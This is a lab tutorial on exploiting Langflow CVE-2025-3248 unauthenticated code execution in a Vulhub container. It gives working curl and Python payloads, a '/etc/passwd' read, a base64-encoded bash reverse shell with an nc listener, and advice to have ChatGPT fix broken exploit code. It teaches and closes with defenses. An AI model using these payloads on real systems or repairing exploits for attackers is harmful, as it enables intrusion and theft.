# 🧨 Vibe Hacking and Exploiting Langflow (CVE-2025-3248)

> 🧠 Learn how to exploit insecure "vibes" in AI tools by walking through a real-world Remote Code Execution (RCE) in Langflow.

---

## 📌 Overview

* **Target**: Langflow < 1.3.0
* **Vulnerability**: Unauthenticated RCE via unsafe code validation
* **CVE**: [CVE-2025-3248](https://www.exploit-db.com/exploits/52262)
* **Category**: Vibe Hacking, Developer Tool Exploitation
* **Skill Level**: Intermediate

---

## ⚙️ Lab Setup (Vulhub)

### 1. 🐳 Start the Vulnerable Container

```bash
cd ~/labs/vulhub/langflow/CVE-2025-3248
docker compose up -d
```

This launches a vulnerable Langflow instance at:

```
http://localhost:7860
```

### 2. ✅ Confirm It's Running

```bash
docker compose ps
```

You should see:

```
0.0.0.0:7860->7860/tcp
```

### 3. 🔍 Open in Browser

Go to [http://localhost:7860](http://localhost:7860) and confirm the Langflow UI loads.

---

## 📄 Check README for Exploit Clues

Langflow’s Vulhub folder often includes a pre-built payload in the README.

```bash
cat README.md
```

Look for a payload like this:

```json
{
  "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']).decode())\")\ndef foo():\n  pass"
}
```

This tells you the vulnerability involves:

* `@exec(...)` decorator trick
* `subprocess` call inside an exception
* Returning output via Langflow's `function.errors` field

---

## 💣 Try the Exploit (Manually)

### Option A: Using curl

```bash
curl -X POST http://localhost:7860/api/v1/validate/code \
  -H "Content-Type: application/json" \
  -d '{"code":"@exec(\"raise Exception(__import__(\u0027subprocess\u0027).check_output([\u0027id\u0027]).decode())\")\ndef foo():\n  pass"}'
```

---

### Option B: Using Python (`exploit2.py`)

```python
import requests

url = "http://localhost:7860/api/v1/validate/code"

payload = {
    "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']).decode())\")\ndef foo():\n  pass"
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, headers=headers, json=payload, timeout=10)
print(f"[*] Status Code: {response.status_code}")
print(f"[*] Response: {response.text}")
```

Run it:

```bash
uv venv critical
source critical/bin/activate
uv pip install requests
uv run python exploit2.py
```

✅ You should see:

```
[*] Status Code: 200
[*] Response: {"function":{"errors":["b'uid=0(root) gid=0(root) groups=0(root)\\n'"]}}
```

---

## 🧠 Why This Works

Langflow’s `/api/v1/validate/code` endpoint:

* Accepts Python code as input
* Executes decorators like `@exec(...)`
* Doesn't sandbox user input
* Doesn’t require authentication

This combo = RCE.

---

## 🧰 Using ExploitDB's PoC

Grab the full PoC from:
📎 [https://www.exploit-db.com/exploits/52262](https://www.exploit-db.com/exploits/52262)

Save it as `exploit.py`, then run:

```bash
uv pip install colorama
uv run python exploit.py http://localhost:7860 "id"
```

> If it fails (e.g., syntax error, empty response), use ChatGPT to debug — paste the code + error.

---

## 🛠️ Use ChatGPT for Debugging

If you hit errors like:

* `SyntaxWarning: invalid escape sequence`
* `function.errors: []`
* `list index out of range`

Paste into ChatGPT and ask:

> “Can you help fix this Langflow exploit? Here's the code and response.”

GPT can:

* Escape payloads safely
* Refactor payload logic
* Add error-handling
* Debug missing responses

---

## 🔁 Expanding the Attack

### ✅ Try Other Commands

```bash
uv run python exploit.py http://localhost:7860 "whoami"
uv run python exploit.py http://localhost:7860 "cat /etc/passwd"
```

### ✅ Reverse Shell (Optional)

1. Start a listener:

```bash
nc -lvnp 9001
```

2. Create base64 payload:

```python
payload = {
  "code": "@exec(\"import base64;exec(base64.b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85MDAxIDA+JjE='))\")\ndef foo():\n  pass"
}
```

Replace the base64 with your reverse shell and correct IP.

---

## 🛡️ Defending Against Vibe Hacking

* 🔐 Disable unsafe endpoints in production
* 🧪 Validate code statically, not dynamically
* 🔒 Add auth to all internal endpoints
* 🕵️‍♀️ Monitor open ports and exposed containers

---

## ✅ Final Checklist

| ✅ Task                         | Status      |
| ------------------------------ | ----------- |
| Launch vulnerable container    | ✅           |
| Verify Langflow is running     | ✅           |
| Check README for payload       | ✅           |
| Test PoC via Python or curl    | ✅           |
| Get `uid=0(root)` confirmation | ✅           |
| Use ChatGPT to fix errors      | ✅           |
| Run other commands             | ✅           |
| Try reverse shell              | ✅           |

---

## 📦 Files to Save

* `exploit.py` → Full color-coded ExploitDB PoC
* `exploit2.py` → Minimal clean Python PoC
* `payload.json` → Raw JSON test payload
* `README.md` → Keep notes and code snippets

---

## 📘 Summary

| Concept          | What You Did                                 |
| ---------------- | -------------------------------------------- |
| Vibe Hacking     | Identified a dev endpoint that executes code |
| Payload Crafting | Built `@exec(...)` Python injection          |
| Exploitation     | Achieved unauthenticated RCE                 |
| ChatGPT          | Used to debug and iterate                    |
| Automation       | Ran code via Python scripts                  |
| Post-exploit     | Reverse shell & file reads                   |

---
